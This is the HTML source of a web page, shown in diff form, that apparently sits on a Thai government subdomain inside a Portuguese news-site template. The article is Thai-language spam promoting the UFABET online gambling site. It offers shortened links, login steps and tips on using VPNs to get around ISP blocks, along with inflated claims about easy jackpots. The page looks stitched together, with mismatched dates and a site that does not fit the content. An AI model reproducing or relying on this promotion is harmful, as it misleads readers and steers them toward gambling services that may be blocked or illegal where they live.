+            <span class=author>Por <a href="https://opsmoacbudget.moac.go.th/author/amoro-padilha/">Amoro Padilha</a></span><time class="date" datetime="ter, 06 de maio de 2025   06:35">10 de março de 2025 às 20:38</time><span class="reading-time">1 minuto de leitura</span>
+<div class="sup-social sup-social--square sup-share-block sup-share-block--postinfo">
+    <ul>
+        <li>
+
+            <a href="https://www.linkedin.com/shareArticle?url=https://opsmoacbudget.moac.go.th" target="_blank" rel="noopener noreferrer" onclick="openLinkInNewWindow(this.href); return false;"><i class="fab fa-linkedin"></i></a>
+        </li>
+        <li>
+            <a href="https://twitter.com/intent/tweet?url=https://opsmoacbudget.moac.go.th&text=UFABET เข้าสู่ระบบ รีวิวลิงค์เข้าสู่ระบบล่าสุดเว็บ UFA มือถือ&via=giz_brasil" target="_blank" rel="noopener noreferrer" onclick="openLinkInNewWindow(this.href); return false;"><i class="fab fa-twitter"></i></a>
+
+        </li>
+        <li>
+            <a href="whatsapp://send?text=https://opsmoacbudget.moac.go.th" target="_blank" rel="noopener noreferrer" onclick="openLinkInNewWindow(this.href); return false;"><i class="fab fa-whatsapp"></i></a>
+
+        </li>
+        <li>
+            <a href="https://www.facebook.com/sharer.php?u=https://opsmoacbudget.moac.go.th" target="_blank" rel="noopener noreferrer" onclick="openLinkInNewWindow(this.href); return false;"><i class="fab fa-facebook"></i></a>
+
+        </li>
+    </ul>
+</div>        </div>
+        <div class="sup-single__content">
+            <h1><span style="font-weight: 400;">UFABET เข้าสู่ระบบ รีวิวลิงค์เข้าสู่ระบบล่าสุดเว็บ UFA มือถือ</span></h1>
+<p ><a href="https://bit.ly/go-ufabet" target="_blank" rel="noopener"><img decoding="async" class="size-full wp-image-636348 aligncenter" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/Captura-de-tela-2025-03-19-134646.png" alt="" width="595" height="144" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/Captura-de-tela-2025-03-19-134646.png 595w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/Captura-de-tela-2025-03-19-134646-300x73.png 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/Captura-de-tela-2025-03-19-134646-320x77.png 320w" sizes="(max-width: 595px) 100vw, 595px" /></a></p>
+<p ><span style="font-weight: 400;">UFABET เข้าสู่ระบบ เป็นจุดเริ่มต้นของการเดิมพันออนไลน์ที่สะดวกและปลอดภัยที่สุดสำหรับผู้เล่นที่ต้องการเข้าใช้งานเว็บ UFA ผ่านมือถือและคอมพิวเตอร์ ไม่ว่าจะเป็นการแทงบอล คาสิโน สล็อต หรือเกมเดิมพันอื่น ๆ การเลือกใช้ ลิงค์เข้าสู่ระบบล่าสุด เป็นสิ่งสำคัญเพื่อให้แน่ใจว่าคุณสามารถเข้าเล่นได้อย่างรวดเร็ว ไม่มีสะดุด และหลีกเลี่ยงปัญหาลิงค์เสียหรือถูกบล็อก ในบทความนี้ เราจะรีวิว ลิงค์เข้า UFABET ล่าสุด พร้อมแนะนำวิธีเข้าสู่ระบบที่ง่ายและปลอดภัยที่สุดสำหรับผู้เล่นทุกคน</span></p>
+<h2><span style="font-weight: 400;">ความสำคัญของ ลิงค์ UFABET เข้าสู่ระบบ</span></h2>
+<p><div class="adCode--xs text-center post-ad"><div class="centralized" id="300x250-parcerias-outras-linguas-1"><script>window.uolads.push({ id: "300x250-parcerias-outras-linguas-1" });</script></div></div></p><p ><span style="font-weight: 400;">ลิงค์ UFABET เข้าสู่ระบบ เป็นช่องทางสำคัญที่ช่วยให้ผู้เล่นสามารถเข้าถึงแพลตฟอร์มการเดิมพันได้อย่างสะดวกและปลอดภัย หากไม่มีลิงค์ทางเข้าที่ถูกต้อง อาจทำให้ผู้เล่นประสบปัญหาในการเข้าสู่ระบบ เช่น เว็บเข้าไม่ได้ ลิงค์โดนบล็อก หรือเกิดความล่าช้าในการโหลดหน้าเว็บ ส่งผลต่อประสบการณ์การเล่นเกมและการเดิมพันโดยตรง นอกจากนี้ การใช้ลิงค์ที่ถูกต้องจากแหล่งที่น่าเชื่อถือ ยังช่วยให้ผู้เล่นมั่นใจได้ว่าข้อมูลส่วนตัวและธุรกรรมทางการเงินของตนเองจะได้รับการปกป้องจากการโจมตีของมิจฉาชีพ</span></p>
+<p ><span style="font-weight: 400;">การใช้ ลิงค์เข้าสู่ระบบ UFABET ที่อัปเดตล่าสุด เป็นสิ่งจำเป็น เนื่องจากเว็บพนันออนไลน์มักถูกจำกัดการเข้าถึงจากผู้ให้บริการอินเทอร์เน็ต (ISP) ในบางประเทศ ทำให้ลิงค์เก่าอาจใช้งานไม่ได้ อีกทั้ง UFABET เองก็มีการปรับปรุงระบบอย่างต่อเนื่องเพื่อเพิ่มความเสถียรและความปลอดภัยของแพลตฟอร์ม ดังนั้น การใช้ลิงค์ที่อัปเดตล่าสุดจากแหล่งที่เชื่อถือได้ จะช่วยให้คุณสามารถเข้าใช้งานได้อย่างราบรื่น ไม่พลาดการเดิมพัน และ หลีกเลี่ยงปัญหาที่อาจเกิดขึ้นจากการใช้ลิงค์ปลอมที่อาจนำไปสู่การถูกหลอกลวงหรือข้อมูลรั่วไหล</span></p>
+<p ><a href="https://bit.ly/go-ufabet" target="_blank" rel="noopener"><img decoding="async" class="aligncenter size-full wp-image-634647" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image1-34.jpg" alt="" width="600" height="450" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image1-34.jpg 600w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image1-34-300x225.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image1-34-240x180.jpg 240w" sizes="(max-width: 600px) 100vw, 600px" /></a></p>
+<h2><span style="font-weight: 400;">วิธีเข้าสู่ระบบ UFABET ผ่านมือถือและคอมพิวเตอร์</span></h2>
+<p><div class="adCode--xs text-center post-ad"><div class="centralized" id="300x250-parcerias-outras-linguas-2"><script>window.uolads.push({ id: "300x250-parcerias-outras-linguas-2" });</script></div></div></p><p ><span style="font-weight: 400;">ทางเว็บรองรับการเข้าสู่ระบบทั้งบนมือถือและคอมพิวเตอร์ เพื่อให้ผู้เล่นเข้าถึงการเดิมพันได้ง่ายและสะดวก ไม่ว่าจะเป็นการแทงบอล คาสิโน สล็อต หรือเกมอื่น ๆ โดยสามารถเข้าใช้งานได้ผ่าน iOS, Android, Windows และ macOS อย่างราบรื่น สิ่งสำคัญคือการใช้ ลิงค์เข้าสู่ระบบล่าสุด เพื่อลดปัญหาลิงค์เสียหรือถูกบล็อก รวมถึงการตั้งค่าบราวเซอร์ให้เหมาะสม หากพบปัญหา เช่น ลืมรหัสผ่าน หรือเข้าเว็บไม่ได้ สามารถแก้ไขได้ตามวิธีที่เราจะแนะนำต่อไป เพื่อให้คุณใช้งานได้อย่างง่ายดายและปลอดภัย</span></p>
+<h3><span style="font-weight: 400;">เข้าสู่ระบบ UFA มือถือ</span></h3>
+<p ><span style="font-weight: 400;">การเข้าใช้งาน UFA มือถือ เป็นวิธีที่สะดวกที่สุด เนื่องจากรองรับทั้งระบบ iOS และ Android ผู้เล่นสามารถเข้าเดิมพันได้ทุกที่ทุกเวลาเพียงทำตามขั้นตอนต่อไปนี้</span></p>
+<ol>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">เปิดเว็บบราวเซอร์ บนมือถือของคุณ เช่น Google Chrome หรือ Safari</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">พิมพ์ URL ลิงค์เข้าสู่ระบบ UFABET ล่าสุด ที่ได้รับจากแหล่งที่เชื่อถือได้</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">กรอกชื่อผู้ใช้ (Username) และรหัสผ่าน (Password) ที่คุณลงทะเบียนไว้</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">กดปุ่ม &#8220;เข้าสู่ระบบ&#8221; เพื่อเข้าสู่หน้าหลักของ UFABET</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">หลังจากเข้าสู่ระบบสำเร็จ คุณสามารถเลือกเดิมพันกีฬา คาสิโน สล็อต หรือเกมอื่น ๆ ได้ตามต้องการ</span></li>
+</ol>
+<p ><b>การตั้งค่าบราวเซอร์ให้เข้าเว็บได้เร็วขึ้น</b></p>
+<ul>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">ล้าง แคช (Cache) และคุกกี้ (Cookies) เป็นประจำ เพื่อลดการโหลดข้อมูลเก่า</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">เปิดโหมด Desktop Site กรณีเว็บแสดงผลไม่สมบูรณ์บนมือถือ</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">ใช้ Wi-Fi หรือเครือข่ายอินเทอร์เน็ตที่เสถียร เพื่อลดปัญหาโหลดช้า</span></li>
+</ul>
+<h3><span style="font-weight: 400;">เข้าสู่ระบบ UFABET ผ่านคอมพิวเตอร์</span></h3>
+<p><div class="adCode--xs text-center post-ad"><div class="centralized" id="300x250-parcerias-outras-linguas-3"><script>window.uolads.push({ id: "300x250-parcerias-outras-linguas-3" });</script></div></div></p><p ><span style="font-weight: 400;">หากคุณต้องการใช้งาน UFABET บนคอมพิวเตอร์ (PC/Laptop) สามารถทำได้ง่าย ๆ ผ่านลิงค์ทางเข้าหลักและลิงค์สำรอง โดย </span><b>ลิงค์หลัก</b><span style="font-weight: 400;"> ใช้เข้าสู่ระบบ UFABET ได้โดยตรง และ </span><b>ลิงค์สำรอง</b><span style="font-weight: 400;"> ใช้ในกรณีที่ลิงค์หลักถูกบล็อกหรือเข้าไม่ได้ โดยมีวิธีดีงนี้</span></p>
+<ol>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">เปิดบราวเซอร์ที่ต้องการใช้งาน เช่น Google Chrome, Safari, Firefox หรือ Microsoft Edge</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">พิมพ์ URL ลิงค์ UFABET ล่าสุด หรือเข้าเว็บผ่านบุ๊คมาร์คที่บันทึกไว้</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">กรอก Username และ Password แล้วกด &#8220;เข้าสู่ระบบ&#8221;</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">เลือกเมนูการเดิมพันที่ต้องการ เช่น แทงบอล คาสิโน หรือสล็อต</span></li>
+<li style="font-weight: 400;" aria-level="1"><span style="font-weight: 400;">หากต้องการให้เว็บโหลดเร็วขึ้น แนะนำให้ใช้ Google Chrome และเปิดใช้งาน โหมดไม่ระบุตัวตน (Incognito Mode )</span></li>
+</ol>
+<p ><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-634651" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image5-38.jpg" alt="" width="600" height="265" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image5-38.jpg 600w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image5-38-300x133.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image5-38-320x141.jpg 320w" sizes="auto, (max-width: 600px) 100vw, 600px" /></p>
+<p ><a href="https://bit.ly/go-ufabet" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-634650" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4.png" alt="" width="1000" height="265" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4.png 1000w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4-300x80.png 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4-970x257.png 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4-320x85.png 320w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4-768x204.png 768w" sizes="auto, (max-width: 1000px) 100vw, 1000px" /></a></p>
+<h2><span style="font-weight: 400;">อัปเดตลิงค์ล่าสุดยูฟ่าเบทและลิงค์สำรอง</span></h2>
+<p ><span style="font-weight: 400;">อัปเดตลิงค์ล่าสุด UFABET &amp; ลิงค์สำรอง เป็นสิ่งสำคัญสำหรับผู้เล่นที่ต้องการเข้าถึงการเดิมพันได้อย่างราบรื่นและปลอดภัย เนื่องจากลิงค์เก่าอาจถูกบล็อกหรือใช้งานไม่ได้ การใช้ ลิงค์ทางเข้าล่าสุด ช่วยให้คุณเข้าสู่ระบบได้อย่างรวดเร็วทั้งบนมือถือและคอมพิวเตอร์ อีกทั้งยังมี ลิงค์สำรอง ที่สามารถใช้ได้ในกรณีที่เว็บหลักถูกจำกัดการเข้าถึง เพื่อให้คุณไม่พลาดทุกโอกาสในการเดิมพัน เราจึงแนะนำวิธีอัปเดตลิงค์และหาแหล่งลิงค์สำรองที่เชื่อถือได้</span></p>
+<h3><span style="font-weight: 400;">เหตุผลที่ต้องใช้ ลิงค์ทางเข้า UFABET ล่าสุด</span></h3>
+<p ><span style="font-weight: 400;">การใช้ ลิงค์ทางเข้ายูฟ่าเบทล่าสุด เป็นสิ่งสำคัญเพื่อให้ผู้เล่นสามารถเข้าใช้งานเว็บไซต์ได้อย่างราบรื่น เนื่องจากบางครั้งลิงค์เก่าอาจถูกบล็อกหรือหมดอายุ ทำให้ไม่สามารถเข้าใช้งานได้ หากคุณใช้ลิงค์ที่อัปเดตล่าสุด จะช่วยให้คุณสามารถเข้าสู่ระบบได้อย่างรวดเร็ว ลดปัญหาการเชื่อมต่อล้มเหลว และสามารถเข้าถึงเกมเดิมพันต่าง ๆ ได้โดยไม่สะดุด นอกจากนี้ทางเว็บยังมีการพัฒนาระบบอยู่เสมอ ทำให้บางลิงค์อาจถูกเปลี่ยนแปลงเพื่อปรับปรุงความเสถียรและความปลอดภัยของแพลตฟอร์ม</span></p>
+<h3><span style="font-weight: 400;">อัปเดต ลิงค์ UFABET Mobile &amp; PC</span></h3>
+<p ><span style="font-weight: 400;">UFABET มีลิงค์ทางเข้าที่รองรับการใช้งานทั้งบนมือถือและคอมพิวเตอร์ เพื่อให้ผู้เล่นสามารถเข้าเดิมพันได้จากทุกอุปกรณ์ โดย ลิงค์ UFABET Mobile ถูกออกแบบมาให้ใช้งานง่าย รองรับการแสดงผลบนหน้าจอสมาร์ทโฟนและแท็บเล็ตได้อย่างสมบูรณ์แบบ ส่วน ลิงค์ UFABET PC จะเน้นความเสถียรและการโหลดที่รวดเร็ว เหมาะสำหรับการเล่นผ่านบราวเซอร์บนคอมพิวเตอร์ ทั้งนี้ การเลือกใช้ลิงค์ที่เหมาะสมกับอุปกรณ์ที่คุณใช้งานจะช่วยให้คุณได้รับประสบการณ์การเดิมพันที่ดีที่สุด</span></p>
+<h3><span style="font-weight: 400;">วิธีหา ลิงค์สำรองกรณีเว็บโดนบล็อก</span></h3>
+<p ><span style="font-weight: 400;">หากพบว่าลิงค์หลักของ UFABET เข้าไม่ได้ ลิงค์สำรอง คือทางออกที่ดีที่สุด โดยคุณสามารถหาลิงค์สำรองได้จาก หน้าเว็บไซต์หลักของ UFABET หรือจากช่องทางโซเชียลมีเดียของเว็บ เช่น LINE หรือ Telegram อีกวิธีหนึ่งคือสอบถามจากฝ่ายบริการลูกค้าเพื่อรับลิงค์ล่าสุด นอกจากนี้ การใช้ VPN หรือเปลี่ยนเครือข่ายอินเทอร์เน็ต (จาก Wi-Fi เป็น 4G/5G) ก็สามารถช่วยให้คุณเข้าเว็บได้โดยไม่ต้องพึ่งลิงค์สำรอง อย่างไรก็ตาม ควรตรวจสอบให้แน่ใจว่าลิงค์ที่ใช้งานนั้นมาจากแหล่งที่น่าเชื่อถือ เพื่อป้องกันการเข้าสู่เว็บไซต์ปลอมที่อาจเป็นอันตรายต่อข้อมูลส่วนตัวของคุณ</span></p>
+<p ><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-634652" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image6-31.jpg" alt="" width="600" height="221" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image6-31.jpg 600w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image6-31-300x111.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image6-31-320x118.jpg 320w" sizes="auto, (max-width: 600px) 100vw, 600px" /></p>
+<p ><a href="https://bit.ly/go-ufabet" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-634650" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4.png" alt="" width="1000" height="265" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4.png 1000w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4-300x80.png 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4-970x257.png 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4-320x85.png 320w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image4-4-768x204.png 768w" sizes="auto, (max-width: 1000px) 100vw, 1000px" /></a></p>
+<h2><span style="font-weight: 400;">จุดเด่นของ UFABET บริการที่ครบวงจร</span></h2>
+<ul>
+<li style="font-weight: 400;" aria-level="1"><b>แทงบอล</b><span style="font-weight: 400;"> : ยูฟ่าเบทเป็นเว็บที่ขึ้นชื่อเรื่อง แทงบอลออนไลน์ มีราคาน้ำที่ดีที่สุด เปิดให้เดิมพันครบทุกลีก ทั้งลีกใหญ่ เช่น พรีเมียร์ลีก ลาลีกา บุนเดสลีกา รวมถึงบอลไทยและบอลถ้วยต่าง ๆ รองรับการเดิมพันหลากหลายรูปแบบ เช่น บอลเดี่ยว บอลสเต็ป สูง-ต่ำ และบอลสดแบบเรียลไทม์</span></li>
+<li style="font-weight: 400;" aria-level="1"><b>คาสิโนสด</b><span style="font-weight: 400;"> : ยูฟ่าเบท ให้บริการ คาสิโนสด ส่งตรงจากค่ายดัง เช่น SA Gaming, AE Sexy, Evolution Gaming มีเกมยอดนิยมอย่าง บาคาร่า, รูเล็ต, เสือมังกร, ไฮโล ถ่ายทอดสดด้วยคุณภาพระดับ HD เดิมพันได้แบบเรียลไทม์กับดีลเลอร์สาวสวย เพิ่มอรรถรสในการเล่น</span></li>
+<li style="font-weight: 400;" aria-level="1"><b>สล็อตออนไลน์</b><span style="font-weight: 400;"> : รวมเกมสล็อตจากค่ายชั้นนำ เช่น PG Slot, Joker Gaming, Pragmatic Play มีให้เลือกเล่นหลายร้อยเกม พร้อม ฟีเจอร์โบนัส แจ็กพอตแตกง่าย เดิมพันขั้นต่ำไม่กี่บาทก็สามารถลุ้นรางวัลใหญ่ได้ รองรับทั้งมือถือและคอมพิวเตอร์</span></li>
+<li style="font-weight: 400;" aria-level="1"><b>เกมยิงปลา</b><span style="font-weight: 400;"> : เกมยอดฮิตที่เล่นง่าย แค่ยิงปลาให้ตายก็ได้เงิน มีระดับความยาก-ง่ายให้เลือก กระสุนเริ่มต้นเพียง 1 บาท เหมาะสำหรับคนที่ต้องการเล่นเกมได้เงินจริง ภาพสวย กราฟิกสมจริง พร้อมฟีเจอร์พิเศษช่วยเพิ่มโอกาสทำกำไร</span></li>
+</ul>
+<h2><span style="font-weight: 400;">วิธีตรวจสอบว่าเป็น ลิงค์ทางเข้ายูฟ่าเบทแท้</span></h2>
+<p ><span style="font-weight: 400;">การเลือกใช้ ลิงค์ทางเข้ายูฟ่าเบทแท้ เป็นสิ่งสำคัญเพื่อป้องกันการถูกหลอกลวงจากเว็บไซต์ปลอมที่อาจทำให้ข้อมูลส่วนตัวและเงินทุนของคุณตกอยู่ในความเสี่ยง วิธีตรวจสอบลิงค์ที่ถูกต้องคือให้เข้าผ่าน แหล่งทางการ เช่น เว็บไซต์หลักของ UFABET หรือสอบถามจาก ฝ่ายบริการลูกค้า ที่สามารถให้ลิงค์อัปเดตล่าสุดได้โดยตรง ลิงค์ที่ถูกต้องควรมี HTTPS อยู่ที่ต้น URL เพื่อแสดงว่าเว็บไซต์มีการเข้ารหัสที่ปลอดภัย และไม่ควรมีอักขระแปลกปลอมหรือโดเมนที่ไม่คุ้นเคย ซึ่งอาจจะเป็นเว็บปลอมที่เลียนแบบ UFABET และควรหลีกเลี่ยงการกดลิงค์จากแหล่งที่ไม่น่าเชื่อถือ เช่น SMS, อีเมล หรือโพสต์จากบุคคลที่ไม่รู้จัก นอกจากนี้ ควรตรวจสอบว่าลิงค์ที่ใช้งานสามารถเข้าสู่ระบบได้อย่างราบรื่น ไม่พบปัญหาเว็บโหลดช้า หรือมีหน้าเว็บที่ผิดปกติ หากไม่แน่ใจให้เปรียบเทียบกับลิงค์ทางเข้าที่มาจากแหล่งที่ได้รับการยืนยัน เพื่อให้มั่นใจว่าคุณกำลังใช้งานลิงค์ UFABET แท้ที่ปลอดภัยและสามารถเข้าเดิมพันได้อย่างไร้กังวล</span></p>
+<p ><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-634649" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image3-41.jpg" alt="" width="600" height="333" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image3-41.jpg 600w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image3-41-300x167.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image3-41-320x178.jpg 320w" sizes="auto, (max-width: 600px) 100vw, 600px" /></p>
+<h2><span style="font-weight: 400;">สรุปรีวิวลิงค์เข้าสู่ระบบ UFABET มือถือล่าสุด</span></h2>
+<p ><span style="font-weight: 400;">การเลือกใช้ ลิงค์ UFABET ล่าสุด เป็นสิ่งสำคัญที่ช่วยให้ผู้เล่นสามารถเข้าสู่ระบบได้อย่างปลอดภัยและรวดเร็ว โดยไม่ต้องกังวลเกี่ยวกับปัญหาลิงค์เสีย หรือการเข้าถึงเว็บไซต์ที่ไม่ถูกต้อง UFABET ได้ออกแบบระบบให้รองรับทั้ง มือถือและคอมพิวเตอร์ ไม่ว่าจะเป็น iOS, Android, Windows หรือ macOS เพื่อให้ผู้เล่นสามารถเดิมพันได้ทุกที่ทุกเวลาอย่างไม่มีสะดุด การเข้าสู่ระบบผ่านมือถือทำได้ง่ายและสะดวก ด้วยลิงค์ทางเข้าที่ปรับให้เหมาะกับอุปกรณ์พกพา รองรับการใช้งานทั้งผ่านบราวเซอร์และแอปพลิเคชัน หากเกิดปัญหาในการเข้าสู่ระบบ เช่น ลืมรหัสผ่าน, ลิงค์เข้าไม่ได้ หรือเว็บถูกบล็อก สามารถแก้ไขได้โดยใช้ ลิงค์สำรองที่อัปเดตล่าสุด หรือ ติดต่อฝ่ายบริการลูกค้า UFABET เพื่อขอความช่วยเหลือตลอด 24 ชั่วโมง นอกจากนี้ เพื่อความปลอดภัย ควรตรวจสอบให้แน่ใจว่าคุณใช้ลิงค์จากแหล่งที่น่าเชื่อถือ และหลีกเลี่ยงการเข้าสู่ระบบผ่านเว็บไซต์ปลอม เพื่อป้องกันข้อมูลรั่วไหลและรักษาความเป็นส่วนตัวของบัญชีคุณ</span></p>
+<h2><span style="font-weight: 400;">คำถามที่พบบ่อย (FAQs)</span></h2>
+<ol>
+<li><b> ลืมรหัสผ่าน UFABET ต้องทำอย่างไร?</b></li>
+</ol>
+<p ><span style="font-weight: 400;">ไปที่หน้า &#8220;ลืมรหัสผ่าน&#8221; กรอก อีเมลหรือเบอร์โทรศัพท์ ที่ใช้สมัคร ระบบจะส่งลิงค์รีเซ็ตรหัสผ่านให้ ทำตามขั้นตอนที่กำหนดเพื่อสร้างรหัสผ่านใหม่ จากนั้นเข้าสู่ระบบได้ตามปกติ</span></p>
+<ol start="2">
+<li><b> ลิงค์เข้า UFABET ใช้ไม่ได้ แก้ไขยังไง?</b></li>
+</ol>
+<p ><span style="font-weight: 400;">ลองใช้ ลิงค์สำรอง ที่อัปเดตล่าสุด หรือล้าง แคชและคุกกี้ของบราวเซอร์ หากยังเข้าไม่ได้ ให้ลองเปลี่ยนไปใช้บราวเซอร์อื่น เช่น Google Chrome หรือ Safari</span></p>
+<ol start="3">
+<li><b> เข้าเว็บ UFABET ไม่ได้เพราะโดนบล็อก แก้ยังไง?</b></li>
+</ol>
+<p ><span style="font-weight: 400;">ใช้ VPN เพื่อเปลี่ยนเครือข่าย หรือเปลี่ยนไปใช้ 4G/5G แทน Wi-Fi หากยังไม่ได้ผล ให้ตรวจสอบ ลิงค์สำรอง UFABET ที่อัปเดตล่าสุดเพื่อเข้าใช้งานได้ตามปกติ</span></p>
+<p >&nbsp;</p>
+
+            
+        </div>
+
+        <div class="sup-single__tags">
+                    </div>
+
+        <div class="sup-single__author">
+            <div class="author 1"><a href="https://opsmoacbudget.moac.go.th/author/amoro-padilha/"><img class="author-avatar" src="https://secure.gravatar.com/avatar/224f3b42e5a1485418b6f23c3dcd0877?s=96&d=blank&r=g" alt="Amoro Padilha"></a><div class="info-wrap"><h4 class="author-name"><a href="https://opsmoacbudget.moac.go.th/author/amoro-padilha/">Amoro Padilha</a></h4><p class="author-desc"></p></div></div>        </div>
+    </div>
+
+</section>
+<aside class="sup-single__aside getHeight">
+    <div class="content-aside full-height">
+        
+<article class="sup-post-card sup-post-card--just-tit " style="--cat-color:#79b42e">
+
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ciencia/">
+                Ciência            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/tem-dificuldade-em-se-concentrar-confira-8-dicas-para-manter-o-foco/">
+
+            Tem dificuldade em se concentrar? Confira 8 dicas para manter o foco
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article>
+<article class="sup-post-card sup-post-card--just-tit " style="--cat-color:#79b42e">
+
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/ciencia/">
+                Ciência            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/apos-13-anos-cientistas-encontram-mini-sapo-monogamico-da-amazonia/">
+
+            Após 13 anos, cientistas encontram mini sapo monogâmico da Amazônia
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article>
+<article class="sup-post-card sup-post-card--just-tit " style="--cat-color:#1551eb">
+
+    
+    
+
+
+            <span class="category">
+
+            <a href="https://opsmoacbudget.moac.go.th/tecnologia/">
+                Tecnologia            </a>
+        </span>
+
+    
+    <h2 class="post-title ">
+        <a href="https://opsmoacbudget.moac.go.th/sem-litio-biobateria-chinesa-gera-energia-atraves-de-bacterias/">
+
+            Sem lítio: biobateria chinesa gera energia através de bactérias
+
+                    </a>
+
+
+
+
+    </h2>
+
+    
+
+        </article>
+            <div id="300x600-parcerias-outras-linguas-1" class="sup-publicidade__wrap">
+    
+            <script>
+                window.uolads.push({
+                    id: "300x600-parcerias-outras-linguas-1"
+                });
+            </script>
+      
+
+
+            <!-- <img src="" alt=""> -->
+
+ 
+    </div>
+
+            <div id="300x250-parcerias-outras-linguas-4" class="sup-publicidade__wrap">
+    
+            <script>
+                window.uolads.push({
+                    id: "300x250-parcerias-outras-linguas-4"
+                });
+            </script>
+      
+
+
+            <!-- <img src="" alt=""> -->
+
+ 
+    </div>
+
+            <div id="300x250-parcerias-outras-linguas-5" class="sup-publicidade__wrap">
+    
+            <script>
+                window.uolads.push({
+                    id: "300x250-parcerias-outras-linguas-5"
+                });
+            </script>
+      
+
+
+            <!-- <img src="" alt=""> -->
+
+ 
+    </div>
+
+    </div>
+</aside></section>
+<section class="sup-offers__carousel sup-slide__mask">
+
+    <div class="sup-slide-btn sup-slide-btn--ofertas sup-container" data-target="sup-slick-ofertas">
+
+        <button class="prev" title="Passar Slide"></button>
+        <button class="next" title="Passar Slide"></button>
+
+
+    </div>
+
+    <div class="sup-container sup-container--oneside">
+
+        <div class="col-tit">
+
+            <span class="sup-offers__header">ofertas em <br>destaque</span>
+
+            <div class="sup-offers__content">
+
+                <div class="sup-slick-ofertas">
+
+                    <div>
+<article class="sup-post-card sup-post-card--oferta " style="">
+
+            <figure class="thumbnail">
+            <a href="https://opsmoacbudget.moac.go.th/caixa-amplificada-mondial-connect-power-plus/">
+                <img width="300" height="180" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Caixa-Amplificada-Connect-300x180.jpg" class="attachment-medium size-medium wp-post-image" alt="Caixa Amplificada Mondial Connect Power Plus" decoding="async" loading="lazy" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Caixa-Amplificada-Connect-300x180.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Caixa-Amplificada-Connect-970x582.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Caixa-Amplificada-Connect-768x461.jpg 768w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/05/Caixa-Amplificada-Connect.jpg 1200w" sizes="auto, (max-width: 300px) 100vw, 300px" />            </a>
+        </figure>
+    
+    
+
+
+            <span class="category">
+
